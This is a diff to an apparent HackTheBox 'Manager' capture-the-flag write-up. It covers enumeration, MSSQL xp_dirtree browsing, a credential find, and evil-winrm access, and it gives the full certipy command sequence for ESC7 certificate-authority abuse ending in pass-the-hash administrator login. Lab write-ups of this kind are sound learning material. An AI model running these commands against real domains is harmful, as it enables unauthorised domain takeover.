@@ -11,34 +11,32 @@ thumb: /assets/images/logos/5ca8f0c721a9eca6f1aeb9ff4b4bac60.webp
 HackTheBox: Medium
 
 ## 1: Enumeration
-
+<br/><br/>
 - nmap scanning
-
- 
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled.png' | relative_url }})
-
+<br/><br/>
 With Rustscan we found 
-
+<br/><br/>
 > 445 SMB
 1433 mssql
 464 kpass
 88 Kerberos
 > 
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_1.png' | relative_url }})
-
+<br/><br/>
 That’s how we find active users in the machine
-
+<br/><br/>
 ~Spray all the users found using Crackmapexec
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_2.png' | relative_url }})
-
+<br/><br/>
 ## 2: User flag
-
+<br/><br/>
 > Crackmapexec is a useful tool but it is not maintained anymore so we are going to chanche a .py file something with the ssl version.
 > 
-
+<br/><br/>
 Enum shared resources
 
 <aside>
@@ -46,45 +44,45 @@ Enum shared resources
 Impacket-mssqlclient
 
 </aside>
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_3.png' | relative_url }})
-
+<br/><br/>
 Once inside of shared resources we were able to access the database tables, we started looking into their contents. We hace content in xp_dirtree
-
+<br/><br/>
 We can check documentation to find web page resources 
-
+<br/><br/>
 ```bash
  EXEc xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
 ```
-
+<br/><br/>
 find a website backup  with creds, use wget to download it locally, using evil-wirm to access
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_4.png' | relative_url }})
-
+<br/><br/>
 ## 3: Priv esc
-
+<br/><br/>
 ```bash
 whoami /groups /priv
 ```
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d/b82b0d24-9101-4b29-aa65-1ba36b52f052-export-dce6182c-3eb1-4736-be26-b09b0fa66d1d_Untitled_5.png' | relative_url }})
-
+<br/><br/>
 Evil winrm a advantage, the capacity of upload and create files from remote machine
-
+<br/><br/>
 ```bash
 upload cerfity.exe
 ./Certify.exe find /vulnerable
 ```
-
+<br/><br/>
 > Now we’re gonna use certipy, with an auth we get  specific vulnerabilities and exploit them
 > 
-
+<br/><br/>
 ```bash
 certipy find -u user@--- -p "rtgre" -enable -vulnearable -target manager.htb
 ```
-
+<br/><br/>
 Vulnerable to ESC7 find mor info [HERE](https://github.com/ly4k/Certipy#esc7) and exploit
-
+<br/><br/>
 ```bash
 #Add an officer named 'raven' to the CA named 'manager-DC01-CA' given managecertificate rights
 certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password '<password>' 
@@ -102,24 +100,27 @@ certipy ca -ca "manager-DC01-CA" -issue-request <private_key_id> -username 'rave
 #Retrieve the issued certificate.
 certipy req -username 'raven@manager.htb' -password '<password>' -ca "manager-DC01-CA" -target manager.htb -retrieve <private_key_id>
 ```
-
+<br/><br/>
 You’ve got a hash for admin with
-
+<br/><br/>
 ```bash
 certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
 ```
-
+<br/><br/>
 Whether for some reason it shows you an error message try to sync servers like this
-
+<br/><br/>
 ```bash
 sudo ntpdate -u manager.htb
 ```
-
+<br/><br/>
 And finally
-
+<br/><br/>
 ```bash
 evil-winrm -i 10.10.11.236 -u administrator -H password
 ```
-
+<br/><br/>
 Machine pwned!!!
 <script src="{{ '/assets/js/matrix-overlay.js' | relative_url }}"></script>
+
+
+<link rel="stylesheet" href="{{ '/assets/css/imagesstyle.css' | relative_url }}">
